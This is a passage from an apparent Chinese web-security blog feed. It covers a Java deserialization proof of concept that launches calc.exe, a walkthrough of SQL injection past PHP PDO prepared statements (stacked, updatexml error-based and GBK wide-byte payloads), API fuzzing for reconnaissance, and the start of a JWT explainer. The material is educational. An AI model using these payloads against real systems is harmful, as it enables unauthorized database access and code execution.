class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shabi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="comment">//控制了反序列化的具体实现，将来攻击的地方就是在于控制它反序列化时执行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream input)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数入口</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Calc calc = <span class="keyword">new</span> Calc();</span><br><span class="line"><span class="comment">//序列化过程，写入被我们控制的了的序列化对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"shabi.txt"</span>);</span><br><span class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">oos.writeObject(calc);</span><br><span class="line">oos.close();</span><br><span class="line"><span class="comment">//反序列化过程，会反序列化出被我们控制了的对象</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"shabi.txt"</span>);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">Calc pwnedcalc = (Calc)ois.readObject();</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只是简单的演示一下最经典的弹计算器，OK我们已经实现被我们<strong>控制的类Serialize接口的实现为弹出计算器</strong>，为了简单我也把序列化和反序列化过程一次写在主函数中，然后我们执行：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt></p><p>成功弹出了计算器。</p><blockquote><p>流程总结：实现了Serialize接口的可被反序列化的Calc类被序列化进shabi.txt文件 -&gt; 从shabi.txt文件中恢复对象 -&gt; 调用被恢复对象的readObject方法 -&gt; 命令执行弹出计算器</p></blockquote><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>这一篇主要是简单写一下关于Java的反序列化的一些简单知识，后面才会具体加上一些例子来Java反序列化的漏洞，前路漫漫，继续努力！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java反序列化&quot;&gt;&lt;a href=&quot;#Java反序列化&quot; class=&quot;headerlink&quot; title=&quot;Java反序列化&quot;&gt;&lt;/a&gt;Java反序列化&lt;/h1&gt;&lt;p&gt;没啥好说的，比赛打太多的憨批只会PHP，实际工作都是Java，鬼特么现在还有人用PHP就奇了
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL预编译绕过</title>
    <link href="http://bai-ren-1.github.io/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/"/>
    <id>http://bai-ren-1.github.io/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/</id>
    <published>2020-03-24T03:37:39.000Z</published>
    <updated>2020-03-24T09:06:06.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL预编译绕过"><a href="#SQL预编译绕过" class="headerlink" title="SQL预编译绕过"></a>SQL预编译绕过</h1><p>众所周知，预编译是用来防御SQL注入的最有效的手段之一。然而只要我们使用了预编译，就能保证万无一失吗？下面通过PHP的PDO进行一番探究。</p><h2 id="0x00-PDO相关配置"><a href="#0x00-PDO相关配置" class="headerlink" title="0x00 PDO相关配置"></a>0x00 PDO相关配置</h2><blockquote><p>PDO::ATTR_EMULATE_PREPARES</p><p>PDO::ATTR_ERRMODE</p><p>PDO::MYSQL_ATTR_MULTI_STATEMENTS</p></blockquote><p>在PDO中，与安全性相关的选项就是上面的三个，分别对应着：模拟预编译，报错，多条执行。</p><h2 id="0x01-动态拼接语句"><a href="#0x01-动态拼接语句" class="headerlink" title="0x01 动态拼接语句"></a>0x01 动态拼接语句</h2><p>下面各个小章节的PDO都由下面的代码执行，其中SQL预编译语句时使用了动态的<strong>参数拼接</strong>（.$_GET[‘field’].）。这是导致错误的最重要因素：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$sql = <span class="string">"select id,"</span>.$_GET[<span class="string">'field'</span>].<span class="string">" from user where username = ?"</span>;</span><br><span class="line">$stmt = $pdo-&gt;prepare($sql);</span><br><span class="line">$stmt-&gt;bindParam(<span class="number">1</span>,$username);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"><span class="keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    var_dump($row);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="01-开启多条执行"><a href="#01-开启多条执行" class="headerlink" title="01.开启多条执行"></a>01.开启多条执行</h3><p>当开启了多条执行时，不论另外两个参数的选项是什么，都可以照成堆叠注入查询多个结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;field=username from user;select id</span><br></pre></td></tr></table></figure><p>因为开启动态拼接，模板语句会拼接成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">"admin"</span></span><br></pre></td></tr></table></figure><p>然后因为开启了多条执行，会导致两个查询语句都被执行，照成堆叠注入。</p><blockquote><p>结论：开启多条执行选项 + 模板语句动态拼接能导致堆叠注入。</p></blockquote><h3 id="02-开启多条执行-报错"><a href="#02-开启多条执行-报错" class="headerlink" title="02.开启多条执行+报错"></a>02.开启多条执行+报错</h3><p>当开启了多条执行和报错时，不论是否开启了非模拟编译，照样同上例可以通过堆叠加报错进行注入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;field=updatexml(0x7e,concat(0x7e,user(),0x7e),0x7e)from user;select id</span><br></pre></td></tr></table></figure><p>拼接到模板语句上面就会拼接成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,updatexml(<span class="number">0x7e</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">0x7e</span>)<span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><p>然后因为开启了报错模式，会导致第一次查询就报错获得结果（我们通过报错信息获得我们要查询的信息）。然后SQL查询报错据推出，第二条正常语句不会执行。</p><blockquote><p>结论：开启多条执行+开启报错执行+模板语句动态拼接能导致报错注入。</p></blockquote><h3 id="03-单独开启报错"><a href="#03-单独开启报错" class="headerlink" title="03.单独开启报错"></a>03.单独开启报错</h3><p>对于多条执行+报错的条件，让我们不禁思考：如果单独开启报错选项，而不能多条执行，还能成功吗？答案是可以的。拼接完的语句依然是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,updatexml(<span class="number">0x7e</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">0x7e</span>)<span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><p>这时候因为没开启多条执行，只能查询一句SQL，所以只会执行报错查询语句（但我们的目的已经达成了）</p><blockquote><p>结论：开启报错执行+模板语句动态拼接，假如报错查询在第一条查询的位置，就能导致报错注入。</p></blockquote><h2 id="0x02-正常绑定语句"><a href="#0x02-正常绑定语句" class="headerlink" title="0x02 正常绑定语句"></a>0x02 正常绑定语句</h2><p>上面章节的导致的注入的其实很傻逼，那是因为它准备的模板语句是动态拼接的，这样和普通的SQL根本没啥区别。</p><p>但如果我们在查询语句中没有可控的参数，并把输入的参数按照prepare-&gt;bindParam-&gt;execute的方式去写就一定没有问题了吗？下面是我们的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select balabala from table1 where 1=?"</span>; </span><br><span class="line">$row = $db-&gt;prepare($query); </span><br><span class="line">$row-&gt;bindParam(<span class="number">1</span>,$_GET[‘id’]); </span><br><span class="line">$row-&gt;execute();</span><br></pre></td></tr></table></figure><h3 id="01-开启模拟编译-多条执行"><a href="#01-开启模拟编译-多条执行" class="headerlink" title="01.开启模拟编译+多条执行"></a>01.开启模拟编译+多条执行</h3><p>我们看下面的代码，模板语句没有拼接，用了占位符绑定参数，看起来很正常：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select balabala from table1 where 1=?"</span>; </span><br><span class="line">$row = $db-&gt;prepare($query); </span><br><span class="line">$row-&gt;bindParam(<span class="number">1</span>,$_GET[‘id’]); </span><br><span class="line">$row-&gt;execute();</span><br></pre></td></tr></table></figure><p>我们在URL中随便输入一个参数：?id=asdasd，然后通过设置SET GLOBAL GENERAL_LOG=ON，从log里看出究竟执行了什么：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/1.png" alt></p><p>我们发现<strong>模拟预编译</strong>的请求发送方式和以往的mysqli并没有什么区别。而且对参数使用<strong>单引号</strong>进行了包裹。于是我们可以尝试输入一些特殊字符，比如单引号： </p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/2.png" alt></p><p>可以看到，他在我们输入的单引号前加上了反斜杠进行转义，自然我们想到了宽字节注入。可见GBK编码下，单引号逃逸了出来。并且因为我们开启了多条执行，所以后面的查询也执行了：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/3.png" alt></p><blockquote><p>结论：模板语句没有动态拼接，并且正常绑定参数。假如设置GBK编码，在模拟编译下可以逃逸出单引进行宽字节注入；并且开启多条执行选项下也照样能堆叠注入。</p></blockquote><h3 id="02-单独开启模拟编译"><a href="#02-单独开启模拟编译" class="headerlink" title="02.单独开启模拟编译"></a>02.单独开启模拟编译</h3><p>要是我们关闭了多条语句查询呢，我们就可以利用联合查询加宽字节来注入吗？答案是可以的：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/4.png" alt></p><p>可以看到使用union进行联合注入也是可以成功注入的，根本不需要进行多句执行（即开不开开启多条查询选项都可以）。 </p><blockquote><p>结论：模板语句没有动态拼接，并且正常绑定参数。假如设置GBK编码，即使仅开启了模拟编译，也可以宽字节逃逸单引号配合联合查询来进行注入。</p></blockquote><h3 id="03-模拟编译与非模拟编译之差"><a href="#03-模拟编译与非模拟编译之差" class="headerlink" title="03.模拟编译与非模拟编译之差"></a>03.模拟编译与非模拟编译之差</h3><p>模拟编译：</p><blockquote><p>在模拟预编译的情况下，PDO对于SQL注入的防范（PDO::queto()），无非就是将数字型的注入转变为字符型的注入，又用类似mysql_real_escape_string()的方法将单引号、双引号、反斜杠等字符进行了转义。所以GBK编码下是能使用<strong>宽字节</strong>进行绕过的。 </p></blockquote><p>非模拟编译：</p><blockquote><p>它对每一句sql语句都进行了预编译和执行两个操作。在执行select balabala from table1 where 1=?这句时，如果是<strong>GBK编码</strong>，那么它将会把?绑定的参数转化成<strong>16进制</strong>，无论输入什么都无法再进行注入。</p></blockquote><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/5.png" alt></p><h3 id="04-非模拟编译效果"><a href="#04-非模拟编译效果" class="headerlink" title="04.非模拟编译效果"></a>04.非模拟编译效果</h3><p>PDO的原理，与Mysql中prepare语句是一样的。上面PDO所执行的SQL语句，用如下的方式可以等效替代： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> @x=<span class="number">0x31</span></span><br><span class="line"><span class="keyword">Prepare</span> a <span class="keyword">from</span> “<span class="keyword">select</span> balabala <span class="keyword">from</span> table1 <span class="keyword">where</span> <span class="number">1</span>=?”</span><br><span class="line"><span class="keyword">Execute</span> a <span class="keyword">using</span> @x</span><br></pre></td></tr></table></figure><blockquote><p>即PDO译原理相当于将参数设置为@x，并转换为十六进制，随后预编译并执行。</p></blockquote><p>PDO中使用非模拟编译的效果也可以通过下面代码实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$db = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'pdotest'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id = <span class="string">"0x"</span>.bin2hex($_GET[<span class="string">'id'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"id:"</span>.$id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">$db-&gt;query(<span class="string">"set @x=&#123;$id&#125;"</span>);</span><br><span class="line">$db-&gt;query(<span class="string">"prepare a from 'select balabala from table1 where 1=?'"</span>);</span><br><span class="line">$row = $db-&gt;query(<span class="string">"execute a using @x"</span>);</span><br><span class="line">$result = $row-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span>($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"结果为："</span>;</span><br><span class="line">print_r($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其运行的结果和使用PDO是一致的：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/6.png" alt></p><h2 id="0x03-场景小结"><a href="#0x03-场景小结" class="headerlink" title="0x03 场景小结"></a>0x03 场景小结</h2><ul><li><p>动态拼接模板语句</p><ul><li>仅开启多条查询：堆叠注入。</li><li>仅开启报错（报错语句必须是第一条）：报错注入。</li><li>开启报错和多条查询：报错注入+堆叠注入。</li></ul></li><li><p>固定模板语句并正常绑定参数</p><ul><li>仅开启模拟编译：宽字节注入。</li><li>开启模拟编译和多条查询：宽字节注入+堆叠注入。</li></ul></li><li><p>非模拟编译防御原理</p><ul><li>绑定参数为GBK编码时，将参数转为十六进制。</li></ul></li></ul><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a> </p><p><a href="https://cloud.tencent.com/developer/news/388755" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/388755</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL预编译绕过&quot;&gt;&lt;a href=&quot;#SQL预编译绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL预编译绕过&quot;&gt;&lt;/a&gt;SQL预编译绕过&lt;/h1&gt;&lt;p&gt;众所周知，预编译是用来防御SQL注入的最有效的手段之一。然而只要我们使用了预编译，就能保证万
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>微服务API利用</title>
    <link href="http://bai-ren-1.github.io/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/"/>
    <id>http://bai-ren-1.github.io/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/</id>
    <published>2020-03-23T09:31:58.000Z</published>
    <updated>2020-03-24T02:52:24.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="微服务API利用"><a href="#微服务API利用" class="headerlink" title="微服务API利用"></a>微服务API利用</h1><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/1.png" alt></p><p>上面是WEB发展的架构变化，下面我们粗略的看看每一个时期的不同的WEB架构特点。</p><h2 id="0x00-单一应用架构"><a href="#0x00-单一应用架构" class="headerlink" title="0x00 单一应用架构"></a>0x00 单一应用架构</h2><p>当网站流量很小时，只需一个应用，将<strong>所有功能</strong>都部署在一起，以减少部署节点和成本。此时，用于简化增删改查工作量的数据访问框架(ORM)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/2.png" alt></p><h2 id="0x01-垂直应用架构"><a href="#0x01-垂直应用架构" class="headerlink" title="0x01 垂直应用架构"></a>0x01 垂直应用架构</h2><p>当访问量逐渐增大，单一应用增加机器带来的加速度越来越小，将应用<strong>拆成</strong>互不相干的几个应用，以提升效率。此时，用于加速前端页面开发的Web框架(MVC)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/3.png" alt></p><h2 id="0x02-分布式服务架构"><a href="#0x02-分布式服务架构" class="headerlink" title="0x02 分布式服务架构"></a>0x02 分布式服务架构</h2><p>当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，使前端应用能更快速的响应多变的市场需求。此时，用于提高业务复用及整合的分布式服务框架(RPC)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/4.png" alt></p><h2 id="0x03-流动计算架构"><a href="#0x03-流动计算架构" class="headerlink" title="0x03 流动计算架构"></a>0x03 流动计算架构</h2><p>当服务越来越多，容量的评估，小服务资源的浪费等问题逐渐显现，此时需增加一个调度中心基于访问压力实时管理集群容量，提高集群利用率。此时，用于提高机器利用率的资源调度和治理中心(SOA)是关键。</p><h2 id="0x04-微服务"><a href="#0x04-微服务" class="headerlink" title="0x04 微服务"></a>0x04 微服务</h2><p>微服务架构是一种架构模式，它提倡将<strong>单一应用程序划分成一组小的服务</strong>，服务之间相互协调、互相配合，为用户提供最终价值。每个服务运行在其独立的进程中，服务和服务之间采用轻量级的通信机制相互沟通（通常是基于HTTP的Restful API)。每个服务都围绕着具体的业务进行构建，并且能够被独立的部署到生产环境、类生产环境等。另外，应尽量避免统一的、集中的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构造。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/5.png" alt></p><h2 id="0x05-API下信息收集"><a href="#0x05-API下信息收集" class="headerlink" title="0x05 API下信息收集"></a>0x05 API下信息收集</h2><blockquote><p>学习了微服务的架构后，我们知道：假如API没有对请求做验证或者可以伪造认证信息，就会导致API接口直接被我们访问。然后我们可以通过FUZZ出API的接口模式（REST风格就改请求方法；其他可以尝试添加uri参数去爆破等），尝试去获取到其提供的数据。</p></blockquote><h3 id="1-微信小程序"><a href="#1-微信小程序" class="headerlink" title="1)  微信小程序"></a>1)  微信小程序</h3><p>许多和目标相关的URL我们无法通过以前的方式搜集到，那么如果目标存在微信小程序，那么我们可以尝试从微信小程序收集些信息。 <strong>微信小程序 -&gt; 更多资料</strong>。</p><h3 id="2-JS文件"><a href="#2-JS文件" class="headerlink" title="2)  JS文件"></a>2)  JS文件</h3><p>JS里面蕴藏了很多有意思的内容，除了大量的<strong>域名</strong>之外，其中最重要的莫过于<strong>目录和参数</strong>。通过JS发现的目录和参数收集起来，组成字典，通过fuzz的思想进行随机组合，会有很多惊喜的出现，出现的这些内容是以往的信息收集无法找到的 。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/7.png" alt></p><blockquote><p>通过JS我们能找到很多和目标相关的信息，其中包括大量的子域名和相关的url，重要的是一些api信息。 </p></blockquote><h3 id="3-爆破参数"><a href="#3-爆破参数" class="headerlink" title="3) 爆破参数"></a>3) 爆破参数</h3><p>即使FUZZ出API的路径，但是访问后提示403是最常见的一种情况。我们猜测是缺少参数。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/6.png" alt></p><p>这时候我们就可以通过收集的大量的参数进行FUZZ（以前是爆破后台等，现在是爆破参数）。如下图对参数以及其值进行爆破。当然API的命名很有规律，有时灵光一现就能直接FUZZ出他的值：</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/8.png" alt></p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>之前会被拉到这方面是因为不太理解API的概念，一知半解。在询问了研发同学加上文章后，就有了一定的认识，瞬间有了关于API方面的漏洞挖掘的思路。刚好看到freebuf上有类似的文章，就转载一下。继续努力吧！</p><p>参考链接：</p><p><a href="https://www.freebuf.com/articles/web/224605.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/224605.html</a> </p><p><a href="https://www.cnblogs.com/jsjwk/p/10769246.html" target="_blank" rel="noopener">https://www.cnblogs.com/jsjwk/p/10769246.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;微服务API利用&quot;&gt;&lt;a href=&quot;#微服务API利用&quot; class=&quot;headerlink&quot; title=&quot;微服务API利用&quot;&gt;&lt;/a&gt;微服务API利用&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JWT</title>
    <link href="http://bai-ren-1.github.io/2020/03/23/JWT/"/>
    <id>http://bai-ren-1.github.io/2020/03/23/JWT/</id>
    <published>2020-03-23T06:35:07.000Z</published>
    <updated>2020-03-24T09:14:25.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>上面两篇博客我们使用的是基于cookie/session来进行<strong>身份认证</strong>。今天就来说一说基于token的身份认证。token中一种常用的形式就是JSON WEB TOKEN，也就是JWT。首先我们从session认证和token认证入手。</p><h2 id="0x00-基于session认证"><a href="#0x00-基于session认证" class="headerlink" title="0x00 基于session认证"></a>0x00 基于session认证</h2><blockquote><p>基于Session的认证一直处于主流地位。由于http协议是无状态的，借助cookie，客户端登陆成功后，服务端就能识别其后续请求，而不需要每次都登陆。它是<strong>有状态的</strong>，即服务端和客户端都需要保存生成的<strong>session</strong>。</p></blockquote><h3 id="基于session认证的流程"><a href="#基于session认证的流程" class="headerlink" title="基于session认证的流程"></a>基于session认证的流程</h3><ul><li>客户端登陆，一般输入用户名和密码。</li><li>服务端如果验证通过，就会生成session，并把它存入数据库中。</li><li>客户端在浏览器上会产生cookie，并把sessionID写入。</li><li>客户端后续有新的请求，都会在请求后携带sessIonID，发给服务端。</li><li>如果客户端登陆出去，该生成的session就会在客户端和服务端都被销毁。</li></ul><h3 id="基于session认证的缺点"><a href="#基于session认证的缺点" class="headerlink" title="基于session认证的缺点"></a>基于session认证的缺点</h3><ul><li><p>Session: </p><p>每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</p></li><li><p>扩展性: </p><p>用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</p></li><li><p>CSRF攻击</p><p>因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p></li></ul><h2 id="0x01-基于token认证"><a href="#0x01-基于token认证" class="headerlink" title="0x01 基于token认证"></a>0x01 基于token认证</h2><blockquote><p>近年来，基于token的认证开始成为主流。该认证方式是<strong>无状态的</strong>，客户端登陆成功后，服务端会生成一个token并把它返还给客户端。由于是无状态的，服务端<strong>不再保存该Token</strong>。 </p></blockquote><h3 id="基于token认证的流程"><a href="#基于token认证的流程" class="headerlink" title="基于token认证的流程"></a>基于token认证的流程</h3><ul><li><p>客户端用自己的机密信息登陆，如用户名和密码</p></li><li><p>服务端验证，验证通过，生成Token返还给客户端。</p></li><li><p>客户端把Token写入local storage，后续请求都携带该Token（token一般都是写入客户端的local storage，不过也可以保存在其他地方）。</p></li><li><p>服务端收到请求时验证Token，如果验证通过，则允许用户访问相应资源。</p></li></ul><h3 id="基于token认证的缺点"><a href="#基于token认证的缺点" class="headerlink" title="基于token认证的缺点"></a>基于token认证的缺点</h3><ul><li>因要服务端给Tooken设置过期时间，不能太长，太长可能被冒用不安全。</li><li>过期时间太短用户体验差。</li></ul><h2 id="0x02-JWT"><a href="#0x02-JWT" class="headerlink" title="0x02 JWT"></a>0x02 JWT</h2><p>JWT是由三段信息构成的，将这三段信息文本用<code>.</code>链接一起就构成了Jwt字符串。就像这样:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p>第一部分我们称它为头部（header），第二部分我们称其为载荷（payload, 类似于飞机上承载的物品），第三部分是签证（signature）。</p><h4 id="1-header"><a href="#1-header" class="headerlink" title="1. 